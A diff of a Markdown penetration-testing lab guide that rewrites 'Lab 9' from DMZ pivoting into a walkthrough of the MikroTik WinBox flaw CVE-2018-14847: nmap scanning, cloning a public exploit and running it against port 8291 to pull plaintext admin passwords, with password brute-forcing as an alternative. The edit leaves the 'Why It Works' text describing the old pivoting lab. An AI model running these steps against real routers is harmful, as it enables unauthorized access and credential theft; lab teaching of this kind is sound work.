@@ -374,42 +374,46 @@ The compromised host’s network interfaces allow routing of traffic to multiple
 
 ### Lab 9: Going Beyond DMZ
 #### Objective
-Pivot through a DMZ host to access internal network resources.
+Exploit Mikrotik router vulnerability to extract password from history of router accounts.
 
 #### Vulnerabilities
-- DMZ Exposure: Compromised DMZ host with internal network access enables pivoting.
+- Mikrotik critical WinBox vulnerability (CVE-2018-14847) which allows for arbitrary file read of plain text passwords
 
 #### Requirements
-Compromised DMZ host must have access to internal network services.
+- Vm should be up and accessible.
 
 #### Steps
 1. **Setup**
    - Verify connectivity to the DMZ host.
    ```bash
-   ping <DMZ_IP>
+   ping <TARGET_IP>
    ```
 2. **Reconnaissance**
    - Scan internal network from the DMZ host.
    ```bash
-   nmap -sP <INTERNAL_SUBNET>
+   nmap -sV -O <INTERNAL_SUBNET>
    ```
+   - You will discover a MikroTik RouterOS device (version 6.40.7) with several exposed services including winbox on port 8291
+   
 3. **Exploitation**
-   - Set up a reverse SSH tunnel to access internal resources.
+   - Clone the the exploit from github and exploit it to get the password.
    ```bash
-   ssh -R 8080:<INTERNAL_IP>:80 user@<DMZ_IP>
-   curl http://localhost:8080
+    git clone https://github.com/BigNerd95/WinboxExploit.git mikrotik
+    cd mikrotik
+    python3  WinboxExploit.py <TARGET_IP> 8291
    ```
+   - Use the obtained credentials to access the Mikrotik web interface with the user admin. The password is also the flag.
 
 #### Why It Works
 The DMZ host’s access to internal networks allows attackers to tunnel traffic through it, bypassing firewall restrictions.
 
 #### Alternatives
-- Use Chisel for reverse tunneling to internal services.
+- You could easily bruteforce the password with ffuf and a seclist password wordlist.
 
 #### Resources
-- [DMZ Pivoting Guide: https://www.hacktricks.xyz/pentesting/pivoting-tunneling](https://www.hacktricks.xyz/pentesting/pivoting-tunneling)
+- [Winbox Vulnerability Dissection: https://n0p.me/winbox-bug-dissection/](https://n0p.me/winbox-bug-dissection/)
 
 #### Notes
-- Ensure the DMZ host allows reverse SSH connections.
+- TODO
 
 ---
